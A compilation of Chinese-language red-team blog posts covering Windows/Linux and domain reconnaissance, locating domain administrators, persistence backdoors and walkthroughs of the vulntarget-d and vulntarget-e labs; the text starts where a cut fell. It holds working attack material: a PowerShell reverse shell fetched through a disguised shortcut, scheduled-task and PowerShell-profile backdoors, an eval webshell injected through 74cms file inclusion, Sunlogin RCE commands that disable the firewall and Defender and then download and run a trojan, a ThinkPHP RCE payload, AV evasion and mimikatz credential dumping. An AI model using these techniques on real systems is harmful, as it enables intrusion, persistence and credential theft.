windows:echo %PROCESSOR_ARCHITECTURE%    Linux:    uname -adpkg --print-architecture   //此命令只适用于基于Debian和Ubuntu的Linux发行版。        getconf LONG_BITarchfile /sbin/init        查看安装的软件及版本、路径等windows:wmic product get name,versionPowershell版本：powershell.exe &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,Version    Linux:    Ls -alh /usr/bin/Ls -alh /sbin/Dpkg -lRpm -qaLs -alh /var/cache/apt/archivesOLs -alh /var/cache/yum/

3.查询本机服务信息windows:wmic service list briefLinux:   service --status-allchkconfig --listps aux进入init.d目录查看netstat -lntpntsysv

4.查询进程列表windows:           tasklist//或者wmic process list brief    Linux:    ps aux   常见杀毒软件进程：                   360sd.exe                     360tray.exe                    ZhuDongFangYu.exe                    KSafeTray.exe                    SafeDogUpdateCenter.exe                    McAfee McShield.exe                    egui.exe //NOD32                     AVP.EXE  //卡巴斯基                    avguard.exe    //小红伞                    bdagent.exe    //BitDefender

5.查看启动程序信息windows:wmic startup get command,caption     Linux:    PSps aux | less  toppstreehtopatop

6.查看计划任务windows:schtasks /query /fo LIST /v   Linux:    crontab -l

7.查看主机开机时间windows:net statistics workstation   Linux:last  reboot //查看历史启动时间W//系统到目前运行了多久时间。反过来推算系统重启时间uptimeTOP//up后表示系统到目前运行了多久时间。反过来推算时间who -b 查看最后一次系统启动的时间。who -r 查看当前系统运行时间

8.查询用户列表windows:net usernet localgroup adinistrators//获取本地管理员组成员query user || qwinsta//查看当前再线用户   Linux:    cat /etc/passwdcat /etc/group延申：cat /etc/passwd|grep -v nologin|grep -v halt|grep -v shutdown|awk -F&quot;:&quot;&#x27;&#123; print $1&quot;|&quot;$3&quot;|&quot;$4 &#125;&#x27;|more

9.列出或断开本地计算机与所连接的客户端之间的会话windows:net session   Linux:    who -a

10.查询端口列表netstat -ano

11.查询补丁列表windows:systeminfo//查找提权补丁信息systeminfo&gt;C:\Temp&gt;micropoor.txt&amp;(for %i in ( KB977165 KB2160329 KB2503665 KB2592799KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find /i&quot;%i&quot;|| @echo %i you can fuck)&amp;del /f /q /a micropoor.txt        //里面可以任意添加删除补丁编号Linux:  linux需要查看内核版本信息，查看安装的软件包，然后进行对比

12.查询本机共享列表windows:net share//wmic:wmic share get name,path,statusLinux:在/mnt/hgfs目录下查看

13.查询路由表及所有可用接口的ARP缓存表windows:route printarp -a  Linux:arp –aRoute/sbin/route -nee

14.查询防火墙相关配置1）关闭防火墙
windows:  //windows server 2003之前netsh firewall set opmode disable                                  //Windows server 2003之后netsh advfirewall set allprofile state off  Linux:    //暂时关闭防火墙systemctl stop firewalldservice iptables stop//永久关闭防火墙systemctl disable firewalldchkconfig iptables  off

2）查看防火墙配置
windows:netsh firewall show config Linux:   Iptables-save &gt;ipt.txt


修改防火墙配置

windows://windows server 2003之前允许指定程序全部连接netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable//windows server 2003之后的版本netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;c:\nc.exe&quot;//允许指定程序退出netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;//允许3389端口放行netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow linux：   //查看防火墙状态systemctl status firewalld//启动防火墙systemctl start firewalld.service//开放TCP的80端口，并重载防火墙firewall-cmd --zone=public --add-port=80/tcp --permanent//重载防火墙 firewall-cmd --reload//查看防火墙开放端口firewall-cmd --zone=public --list-ports

4)自定义防火墙日志的存储位置
windows:netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;Linux:  参考文章https://blog.csdn.net/xiexievv/article/details/48001261

15.查看代理配置情况windows:reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;   Linux:    source /etc/profile

16.查询并开启远程连接服务1）查看远程连接端口
reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber

2)在Windows server 2003中开启3389
wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1

3)在Windows server 2008和2012中
wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1//修改注册表方式reg query &quot;HKLM\System\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f

17.自动收集信息Empire下的主机信息收集，输出到格式为html文件使用模块：
usemodule situational_awareness/host/winenumexecute

18.查询当前权限windows:whoami /all//查询指定用户的详细信息net user xxx /domain  Linux:    idwhoami

03-域内的信息收集1.判断是否存在域查看dns服务器ipconfig /allnslookup dc.test.local//将查看到的DNS服务器用nslookup进行解析        查看系统详细信息systeminfo | findstr /B /C:&quot;登录服务器&quot;//如果结果不为&quot;WORKGROUP&quot;则主机为域主机                      //查询当前登录域及登录用户信息net group workstation                     //判断主域net time /domain//命令用于查看域内时间，同时也可以查看域控制器

2. 探测域内存活主机使用nbtscan(http://www.unixwiz.net/tools/nbtscan.html)探测当前网段主机nbt.exe 192.168.2.0/20        使用ICMP探测for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.2.%I | findstr &quot;TTL=&quot;        通过ARPscan工具扫描探测内网arp.exe -t 192.168.2.0/20        Empire中的ARPscan模块usemode situational_awareness/network/arpscanexecuteNishang中的Invoke-ARPScan.ps1 powershell.exe -exec bypass -Command &quot;&amp; (Import-module c:\windows\temp\Invoke-ARPscan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/20)&quot; &gt;&gt; c:\windows\temp\log.txttype c:\windows\temp\log.txt        通过常规的TCP/UDP端口扫描探测内网上传ScanLine进行扫描：scanline -h -t 22,80-90,110,445 -u 53,161 -O c:\windows\temp\log.txt -p 192.168.1.1-254 /b

3.扫描域内端口telnet(但是这个速度太慢了点)Metasploit端口扫描:auxiliary/scanner/portscan/tcpset ports 1-1000set RHOST 192.168.1.1set THREADS 10run        PowerSploit、NiShang的Invoke-portscan脚本注：msf记得添加路由或代理autoroute添加路由run autoroute –h #查看帮助run autoroute -s 192.168.159.0/24  #添加到目标环境网络run autoroute –p  #查看添加的路由                      当然msf不止有扫描端口的脚本，这里在列举几个其他脚本： 1. use auxiliary/scanner/http/dir_scanner 2. use auxiliary/scanner/http/jboss_vulnscan 3. use auxiliary/scanner/mssql/mssql_login 4. use auxiliary/scanner/mysql/mysql_version 5. use auxiliary/scanner/oracle/oracle_login//扫描的脚本位于：/usr/share/metasploit-framework/modules/auxiliary/scanner/

4. 收集域内基础信息net view /domain//查询域net view /domain:test//查询域内所有计算机net group /domain//查询域内所有用户组列表 net group &quot;domain computers&quot; /domain//查询所有域成员计算机列表net accounts /domain//获取域内密码信息nltest /domain_trusts//域内信任信息

5. 查找域控nltest /DCLIST:testnet time /domain  Nslookup -type=SRV _ldap._tcp  net group &quot;Domain Controllers&quot; /domain  netdom query pdc//查看主控制器

6. 获取域内的用户和管理员信息//查询所有域用户列表net user /domain //获取域内用户的详细信息wmic useraccount get /all //查看存在的用户,但是这个只能在域控或者安装了对应服务的主机使用，否则会提示命令不存在dsquery user //查找目录中的计算机dsquery computer //查询本地管理员组用户net localgroup administrators //查询域管理员用户组net group &quot;domain admins&quot; /domain //查询管理员用户组net group &quot;Enterprise Admins&quot; /domain

7. 定位域管理员在获取了Windows域中的普通权限在进行横向渗透时，需要知道域内用户登录的位置，是否是任何系统&#x2F;主机的本地管理员，以及所属组等关键信息。 这里直接用前辈们造的轮子吧，能够使用的轮子有：psloggedon.exe、PVEFindADUser.exe、netness.exe、hunter、NetView、PowerView。
psloggedon.exe//能够通过此工具查看远程计算机的资源，也就是说能够查看目标主机有哪些账户在登录状态        下载地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon使用：psloggedon.exe \\dc2012  PVEFindADUser//PVEFindADUser能够用于查找活动目录用户登录的位置，枚举与用户，以及查找在特定计算机上登录的用户。包括本地用户、通过RDP登录的用户、用于运行服务和计划任务的用户。（这个工具需要.NET 3.5）Windows Server 2012安装.NET 3.5可能不成功，需要指定安装源：https://www.cr173.com/soft/921507.html下载地址：https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOnPVEFindADUser.exe -current        NetView//NetView是一个枚举工具，使用WinAPI枚举系统，利用NetSessionEnum找寻登陆会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录的用户。同时还能够查询共享入口和有价值的用户。下载地址：https://github.com/mubix/netview           PowerView使用Powerview的Invoke-UserHunter。            Empire//Empire中也存在此类型的脚本：usemodule situational_awareness/network/powerview/user_hunterexecute            Nmap的NSE脚本//通过Nmap的NSE脚本获取远程机器的登陆会话。smb-enum-sessions.nse获取域内主机的用户登录会话，查看当前是否有用户登录。下载地址：https://nmap.org/nsedoc/scripts/smb-enum-sessions.htmlsmb-enum-domains.nse对域控制器进行信息收集，可以获取主机信息用户、可使用密码策略的用户等。smb-enum-users.nse可以使用此脚本对域控进行扫描。

8. 查找域管理进程
参考文章：https://yq.aliyun.com/articles/599377?type=2

本机检查：//获取域管理员列表net group &quot;Domain Admins&quot; /domain//列出本机的所有进程和进程用户tasklist /v//查询域控的域用户会话//查询域控列表net group &quot;Domain Controllers&quot; /domain//收集所有活动域的会话列表netsess -h

9. 补充一点linux信息收集姿势常见的配置文件有那些？有没有可攻击的插件：
Cat /etc/syslog.confCat /etc/chttp.confCat /etc/lighttpd.confCat /etc/cups/cupsd.confCat /etc/inetd.confCat /etc/apache2/apache2.confCat /etc/my.confCat /etc/http/conf/http.confCat /opt/lampp/etc/httpd.confLs -aRl /etc/ | awk &#x27;$1 ~ /^.r./

查找系统内跟用户名和密码的有关的文件
Grep -I user [filename]grep -i pass [filename] grep -C 5 “password” [filename] find . -name “*.php” -print0 | xargs     -0 grep -i -n “var $password” # Joomla]]></content>
      <categories>
        <category>红队笔记</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>内网基础-定位域管理员</title>
    <url>/2021/03/18/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/</url>
    <content><![CDATA[前言：在域渗透中，需要对有目的性的渗透，快速控制一个域最快的办法（不包括直接利用提升为域管的漏洞）就是拿到域管理员的hash，然后对域控进行dcsync，拿到域内所有成员的hash，那么我们如何定位域管理员在哪台机器上登录过？
当然窃取凭据域管理员进程也是一个不错的选择！
1.通过net group “domain admins” &#x2F;domain 列出域管理员组成员
2.通过tasklist &#x2F;v 列出本地进程的所有者
3.进行交叉处理，找到域管理进程
通过域搭建的原理来看，在机器加入域之后，域管理员组成员会自动加入到本地的管理员组。
定位域管理员的常规渠道：
1.日志（本地管理员日志）
2.会话（域内每台机器的登陆回话）
常用工具psloggedon.exe这是微软的自带的pstool工具包的一个非常实用的工具，其原理为检查注册表HKey_USER项的key来查询，会调用NetSession api,所以有些功能需要管理员权限。
命令：
psloggedon 要列出登陆信息的机器名或者用户名#如果没有填 则默认为本地如果指定用户名，则会搜索次用户登陆过哪些机器




描述




-
显示支持的选项和用于输出值的度量单位


-l
仅显示本地登录，而不显示本地和网络资源登录


-x
不显示登录时间


\computername
指定要为其列出登录信息的计算机的名称


username
指定用户名，在网络中搜索该用户登陆的计算机


配合net localgroup administrators 找到域管登陆过的机器
PVEFindaduser.exe用于查找AD用户的登录位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括本地用户、通过RDP登陆的用户、用于运行服务和计划任务的用户。
命令：
PVEFindADUser.exe -current#将获取域内所有计算机上当前登陆的所有用户结果保存到report.csv文件




参数
描述



-last
将获取目标计算机的最后一个登陆用户


-target
指定要查询的计算机


-current [“username”]
-current参数显示每台PC上当前登录的用户在域中。如果指定用户名（在引号之间），则仅将显示该特定用户登录的PC


-noping
阻止尝试枚举用户登录名之前对目标计算机执行ping命令


netview.exenetview.exe是一个枚举工具，使用WinAPI枚举系统，利用NetSessionEnum找寻登录会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录的用户，netview.exe还可以查询共享入口和有价值的用户。
netview.exe &lt;参数&gt;




-h
显示帮助信息



-f
filename.txt:指定要提取主机列表的文件


-e
filename.txt:指定要排除的主机名的文件


-o
filename.txt:将所有输出重定向到指定的文件


-d
filename.txt:指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表


-g
group:指定搜索的组名。如果没有指定，则在Domain Admins组中搜索


-c
对已找到的共享目录&#x2F;文件的访问权限进行检查


nmap 脚本可以使用nmap的smb-enum-sessions.nse引擎获取远程主机的登陆会话（不需要管理员权限）
其他域渗透脚本smb-enum-domains.nse:对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等
smb-enum-users.nse:在进行域渗透时，如获取了域内某台主机权限，但权限有限，无法获取更多的域用户信息，可借助此脚本对域控制器进行扫描
smb-enum-shares.nse:遍历远程主机的共享目录
smb-enum-processes.nse:对主机的系统进程进行遍历，通过此信息，可知道目标主机运行着哪些软件
smb-enum-sessions.nse:获取域内主机的用户登陆会话，查看当前是否有用户登陆
smb-enum-discovery.nse:收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息
Powerview脚本主要涉及到定位关键用户的功能如下两个模块

Invoke-StealthUserHunter:只需要进行一次查询，就可以获取域里面的所有用户，使用方法为，从user.HomeDirectories中提取所有用户，并对没太服务器进行Get-NetSession获取。因不需要使用Invoke-UserHunter对没太机器进行操作，所以这个方法的隐蔽性相对较高（但涉及的机器不一定全面）。PowerView默认使用Invoke-StealthUserHunter如果找不到需要的信息，就使用Invoke-UserHunter
Invoke-UserHunter:找到域内特定的用户群，接受用户名、用户了表和域组查询，接收一个主机列表或查询可用的主机域名。可以使用Get-NetSession和Get-NetLoggedon(调用NetSessionEnum和NetWkstaUserEnumAPI)扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，在使用时不需要管理员权限，在本地执行该脚本

Empire 模块Empire 模块中也有功能和invoke-userhunter一样的模块，user_hunter，Empire我平时也不咋用，还得反弹shell到Empire属实有点麻烦，了解了解就行。
实际的域里面，大规模的枚举是会惊动ids等防护设备的
介绍完工具再来说说手动：
手工配合Netsess筛选数据首先收集域控列表：
net group “Domain Controllers” /domainNslookup –type=SRV _ldap._tcp。。。。。。。。

收集域管列表
net group “Domain Admins” /domain

通过Netsess.exe查询每个域控制器，收集所有活动域会话的列表
Netsess.exe -help #获取帮助

-full Full session info (requires admin)
-h servername  Alternate method to specify server
-u username    Username to filter for
-c client name Alternate method to specify client name

cmd联合命令：
FOR /F %i in (dc.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR /F %a in (domain_admins.txt) DO @type sessions.txt | @findstr /I %a

Dc.txt为收集的域控制器列表，domain_admins.txt为收集的域管列表
Get-NetLocalGroupMember 枚举远程计算机本地组安装Recon模块
Set-ExecutionPolicy -ExecutionPolicy Bypassimport-module .\Recon.psd1

指定远程计算机，指定枚举管理员组
Get-NetLocalGroupMember -ComputerName 主机名 -GroupName administrators 
]]></content>
      <categories>
        <category>红队笔记</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>持久性技巧</title>
    <url>/2021/09/30/%E6%8C%81%E4%B9%85%E6%80%A7%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[
“今天，我将介绍关于hacker拿到一台服务器之后，如何建立持久性的后门的一些非常实用的小技巧！”

前言能留后门的工具很多，技术方法也很多，但是今天我将介绍一些简单并且异常实用的方法。
1.快捷链接方式对，你想的没错，我们就是创建一个快捷方式，里面的链接替换上我们的有效载荷，欺骗管理员点击，运行我们的shell和执行代码。
用社会工程学的角度来提高我们方法的可行性的几点：1.替换的快捷图标可以改成一些常用的软件，但不仅限于软件，提高管理员点击的可能性。2.改好的快捷方式可以放在比较显眼的地方，进一步提高可能性。3.最好不要用一些没用过或者安装过软件或者其他东西的快捷链接，这可能会引起怀疑。4.可以查看一波常用软件实用频率记录，比如可以从360软件管家这些第三方软考，也可直接查看控制面板中的程序实用频率。
演示：我们创建一个安全狗快捷链接：这里我用我的windows7虚拟机创建安全狗的快捷链接尝试实用cmd.exe起powershell执行反弹shell。这里我直接用python起个简单的http服务
$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.73.136&quot;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;# &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()

把上述代码另存为shell.ps1点开快捷链接属性，替换target为：
cmd /c “powershell IEX (New-Object Net.WebClient).DownloadString(\&quot;http://192.168.73.136/shell.ps1\&quot;);”

再把快捷链接图标换了，然后一个后门快捷方式就做好了

**弊端：**但是这种方式有个很严重的弊端，就是执行了cmd 窗口会弹出来，这就很狗带，期间我也想过如何把这个玩意关掉，但是从理论上感觉不太行，各位师傅可以自行研究一番，我可能太菜了，没玩明白！结束cmd进程，相应的shell也会死掉，期间想过各种方式，方法，但都没用，这是一个很烧脑的东西！

优化：我们完全可以用木马可执行文件来替换cmd执行powershell，这样后台将不会有任何操作显示，这样隐蔽一点，只需要把木马可执行文件绝对路径替换成链接的target就行了，这里仅提供一个思路，后续研究各位请继续。
你以为这就结束了？不，还能玩玩。
进一步优化：前面虽然执行了木马文件，但是真正链接的程序我们并没用执行，而是被替换掉了，这样就会让人引起怀疑，就会猜测是不是路径错了，一打开快捷方式属性，然后就露馅了嘛，所以我又自己瞎倒腾！
首先建立一个bat文件，文件内容为：
@start C:\\Users\\hacker\\Desktop\\msf.exe//启动恶意程序@&quot;C:\\Program Files (x86)\SafeDog\SafeDogSiteApache\SafeDogSiteApache.exe&quot; //启动正常程序

然后快捷方式链接换成这个bat文件的链接，这样将会即执行了反弹shell，又会执行正常程序，能有效降低管理员的怀疑。

但是最后还是会有个cmd框，难受，但是没显示出执行的命令，还是有点优化效果的！
2. 计划任务方式计划任务是一个很棒的后门方法，因为根本不需要用户交互，不需要高的权限，普通用户也可以写，是一款易于使用的方法。
这里我设置了定时任务，命令：
schtasks  /create  /tn  testschtask /tr C:/Users/hacker/Desktop/msf.exe   /sc  DAILY /st  15:33:00

当然你完全可以设置一分钟就执行一次，例如这里我创建了一个windows updates任务，每分钟执行一次，你只需要把PATH替换成你的恶意程序路径就行了，命令：
schtasks /create /sc minute /mo 1 /tn &quot;Windows Updates&quot; /tr &quot;PATH&quot; 


这样是非常nice的，是非常隐蔽实用的，你只需要在哪里监听，就会获得甜美的shell。
3. Powershell配置文件：PowerShell配置文件是一个PowerShell脚本，您可以对其进行自定义，并将其特定于会话的元素添加到您启动的每个PowerShell会话中。它是一个在PowerShell启动时运行的脚本，你可以使用配置文件作为登录脚本来自定义环境，你可以添加命令，功能，别名，模块等。此外PowerShell支持多个配置文件，PowerShell主机程序可以支持其自己的主机特定配置文件。
一些样例：



Description
Path



All Users, All Hosts
$PSHOME\Profile.ps1


All Users, Current Host
$PSHOME\Microsoft.PowerShell_profile.ps1


Current User, All Hosts
$Home\[My ]Documents\PowerShell\Profile.ps1


Current user, Current Host
$Home\[My ]Documents\PowerShellMicrosoft.PowerShell_profile.ps1


PowerShell配置文件脚本存储在文件夹“ WindowsPowerShel”中，默认情况下对用户隐藏。如果有效负载已放入磁盘，则可以使用。
cmdlet指向可执行文件的位置，命令：
start-Process

确定当前用户的配置文件是否存在，命令：
test-Path $ profile

如果配置文件不存在，将为当前用户创建一个配置文件，命令：
new-Item -Path $ Profile -Type File -Force

重写该配置文件
out-File

演示：

这样我每打开一个新的powershell窗口，将会执行恶意程序！

演示所用的命令：
echo $profiletest-Path $profilenew-Item -Path $profile -Type File –Force$string = &#x27;Start-Process &quot;C:\\Users\\hacker\Desktop\\msf.exe&quot;&#x27;$string | Out-File -FilePath &quot;C:\Users\hacker\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1&quot; -Append

与启动进程类似，“ Invoke-Item ” cmdlet可用于执行项目的默认操作，即运行文件，打开应用程序等。launcher.bat是Empire生成的有效负载，具有自我删除的能力作为更秘密的选择执行时，因为它不会创建新进程。
所需要的命令
echo $profiletest-Path $profilenew-Item -Path $profile -Type File –Forceadd-Content $profile &quot;Invoke-Item C:\tmp\launcher.bat&quot;$string | Out-File -FilePath &quot;C:\Users\hacker\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1&quot; -Append

这样当PowerShell在系统上再次启动时，将执行该文件，并且代理将与命令和控件进行通讯。执行过程不会像上面的示例那样在系统上创建新进程，而是使用现有的PowerShell进程，更为隐蔽。
cmdlet“ Invoke-Command ”的用法中允许执行命令，所以regsvr32方法可以用作隐藏选项，因为它可以规避未正确配置的应用程序白名单解决方案，并且可以从远程执行scriptlet。
参考命令：
echo $profiletest-Path $profilenew-Item -Path $profile -Type File –Force$string = &#x27;Invoke-Command -ScriptBlock &#123; regsvr32 /s /n /u /i:http://192.168.73.136:80/jWcEbr.sct scrobj.dll &#125;&#x27;$string | Out-File -FilePath &quot;C:\Users\hacker\Documents\WindowsPowerShel

Metasploit框架包含一个模块（web_delivery），该模块可以生成并提供恶意scriptlet文件。但是，其他命令或者控制（C2）框架（例如PoshC2）也支持此功能，并且与Metasploit相比，可以提供扩展的功能。

注意：使用多个命令对PowerShell配置文件进行大量修改会向用户发送一条有关增加加载时间的消息。但是，执行一个命令不会产生任何消息，有效负载将在后台运行，并且用户不会注意到任何异常。
]]></content>
      <categories>
        <category>红队笔记</category>
      </categories>
      <tags>
        <tag>权限维持</tag>
      </tags>
  </entry>
  <entry>
    <title>vulntarget-d</title>
    <url>/2022/12/06/vulntarget-d/</url>
    <content><![CDATA[
机器密码
ubuntu：eval&#x2F;vulntarget
win7: crow&#x2F;admin
拓扑


信息收集扫描一下存活主机与端口，发现开放了80、81、888、3306、8888端口，有宝塔的服务

访问80端口也能看出是个宝塔页面的提示

81端口是个骑士cms，从底部可以看出其版本是74cms v6.0.20，是个开源的项目并且存在已知漏洞

搜索一下可以发现应该是存在文件包含的漏洞

漏洞利用首先POST提交payload将一句话写入到日志
/index.php?m=home&amp;a=assign_resume_tplPOST：variable=1&amp;tpl=&lt;?php fputs(fopen(&quot;tx.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(\$_POST[x]);?&gt;&quot;)?&gt;; ob_flush();?&gt;/r/n&lt;qscms/company_show 列表名=&quot;info&quot; 企业id=&quot;$_GET[&#x27;id&#x27;]&quot;/&gt;


然后POST提交文件包含日志生成webshell文件
variable=1&amp;tpl=data/Runtime/Logs/Home/22_12_05.log


接着就可以用蚁剑成功连接

Ubuntu提权msf生成shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.150.128 LPORT=4444 -f elf &gt; test.elf

通过蚁剑上传并运行
chmod 777 shell1.elf./test.elf

然后kali开启msf并上线
use exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcpset lhost 192.168.150.128run

反弹shell
python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;

在桌面文件中存在一个flag：flag{welcome_to_vulntarget-d}

接着可以通过cve-2021-4034提权到root权限，先本地将其编译好再通过蚁剑上传后运行

内网渗透可以得知内网段是205

上传fscan进行扫描

接着设置代理
# 添加路由run autoroute -s 192.168.205.0/24run autoroute -p


# 开启代理use auxiliary/server/socks_proxyset srvhost 192.168.150.128set version 4arun


发现存活主机：192.168.205.133
use auxiliary/scanner/discovery/udp_sweepset rhosts 192.168.205.100-200run


扫描一些常见端口，可以发现开放了80、139、445、3306
use auxiliary/scanner/portscan/tcpset rhosts 192.168.205.133set ports 22,23,80,139,445,1433,3306,3389,8080run


或者通过frp建立代理（设置的端口不能小于3000还是多少的，现在不开了
./frps -c ./frps.ini


./frpc -c ./frpc.ini &amp;


访问80发现就一个hello world没啥用

接着扫一下目录发现phpinfo.php、l.php和phpmyadmin


然后phpmyadmin存在弱口令root&#x2F;root

这里可以发现secure_file_priv为NULL，所以我们就不能直接写文件getshell

接着尝试写日志getshell
# 查询general_log配置show global variables like &quot;%genera%&quot;;# 开启日志set global general_log=on;# 修改日志文件名称和存放位置：set global general_log_file=&#x27;C:/phpstudy/PHPTutorial/www/shell.php&#x27;;# 写入一句话select &#x27;&lt;?php @eval($_POST[a]);?&gt;&#x27;


蚁剑成功连接

进入后进行信息收集，不存在域也不存在下一层内网，打了四个补丁

接着检查进程是否有杀软，发现存在火绒
tasklist /svc


所以接下来需要做一个免杀马

https://github.com/crow821/crowsec/tree/master/BypassAV_360_huornog

通过蚁剑上传jpg、bin文件和加载器
# 生成shellcodemsfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 7 -b &#x27;\x00&#x27; lport=4444 -f raw -o crowsec.jpg

启动cs，生成payload.bin

msf设置正向连接，蚁剑运行crowsec_shelllcodeBypass.exe成功上线
use exploit/multi/handlerset payload windows/meterpreter/bind_tcpset lhost 192.168.150.128run

然后可以直接getsystem得到system权限

在桌面找到flag：flag{happy_new_year_vulntarget-d}

后面猕猴桃抓密码没结果

解决办法：
查看一下进程，找到crowsec_shelllcodeBypass.exe，将进程迁移到x64位上去（要迁移到system的user上），然后再次执行命令，即可获取明文密码（忘了截图也懒得再去弄一个
getpidpsmigrate &lt;pid&gt;]]></content>
      <categories>
        <category>靶场通关</category>
      </categories>
      <tags>
        <tag>vulntarget</tag>
      </tags>
  </entry>
  <entry>
    <title>vulntarget-e</title>
    <url>/2022/12/09/vulntarget-e/</url>
    <content><![CDATA[
虚拟机网络配置：

拓扑图：


信息搜集扫描存活主机和端口

这里外网win2016靶机有开防火墙，所以需要加个-d参数绕过防火墙进行端口扫描，但是这里扫的时候出了点问题，不过多试几次也能扫出来开放了5985端口(WinRM服务)和49773端口

后面发现这样来扫会更快
nmap -sC -sV -p- 192.168.150.137 -n -vv --min-rate=2000


其中49773端口不知道是开着什么服务

扫目录也没发现啥有用信息

接着利用指纹识别工具**observer_ward**扫一下发现是向日葵服务（第一次使用的话使用-u 参数从指纹库中更新指纹

漏洞利用可以利用前段时间爆出来的向日葵远程rce漏洞，通过工具**sunRce**进行命令执行

查看防火墙状态发现是打开的，于是通过命令执行将其关闭
./sunRce -h 192.168.150.137 -p 49773 -c &quot;netsh advfirewall show allprofile state&quot; -t rce./sunRce -h 192.168.150.137 -p 49773 -c &quot;netsh advfirewall set allprofiles state off&quot; -t rce


再执行命令tasklist &#x2F;svc发现开着Defender，并命令执行将其关闭，但是它实时保护还是开着，上传的木马还是会被df杀掉
./sunRce -h 192.168.150.137 -p 49773 -c &quot;tasklist /svc&quot; -t rce./sunRce -h 192.168.150.137 -p 49773 -c &quot;set-MpPreference -DisableRealtimeMonitoring $true&quot; -t rce


所以我们可以制作免杀马或者通过powershell的这条语句执行策略绕过
./sunRce -h 192.168.150.137 -p 49773 -c &quot;powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath \&quot;C:\Users\Administrator\&quot;&quot; -t rce


msf生成木马并开启web服务
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.150.128 lport=4444 -f exe &gt; test.exepython -m http.server 80

下载文件并执行
./sunRce -h 192.168.150.137 -p 49773 -c &quot;powershell(new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.150.128/test.exe&#x27;,&#x27;C:\Users\Administrator\test.exe&#x27;)&quot; -t rce./sunRce -h 192.168.150.137 -p 49773 -c &quot;cd C:\Users\Administrator;dir&quot; -t rce./sunRce -h 192.168.150.137 -p 49773 -c &quot;start C:\Users\Administrator\test.exe&quot; -t rce


msf成功上线
use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.150.128run


进入后信息收集一波

在桌面发现需要测试的地址.txt


然后这里猕猴桃抓密码还是没结果

根据上次的经验，我们将进程迁移到x64位上去

再执行一下即可获取到密码


普通用户的话可以抓下来本地用mimikatz读取
reg save hklm\sam sam.hivereg save hklm\system system.hive lsadump::sam /sam:sam.hive /system:system.hive

也可以通过cs生成木马来实现上线


信息收集


利用hashdump或者猕猴桃抓取密码

最后解码得到管理员和普通用户密码：administrator&#x2F;win2008；ash&#x2F;qweASD123


在桌面找到文件需要测试的地址.txt

portscan扫描发现192.168.100.131，存在22、80、3333、8888端口，可以知道用了宝塔

内网渗透上传frp客户端建立代理

./frps -c ./frps.ini


frpc.exe -c ./frpc.ini &amp;


通过msf查看浏览器的历史记录
run post/windows/gather/forensics/browser_history


用sqllite打开它，执行如下语句，可以发现几个有用的路径信息
select url from moz_places


但是访问都是报400

这时候回想起前面我们dump下来的需要测试的地址.txt，猜测应该要host碰撞
通过工具**hostscan**可以发现192.168.100.131对应的域名地址是www.cJO6w10YLS.com

然后修改一下host头可以发现是thinkphp 5.0

搜一下这个版本的漏洞看到有个5.X的rce

https://www.freebuf.com/articles/web/289860.html

尝试发现system会被宝塔拦截，不过eval没有被ban，可以用eval写马
?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami


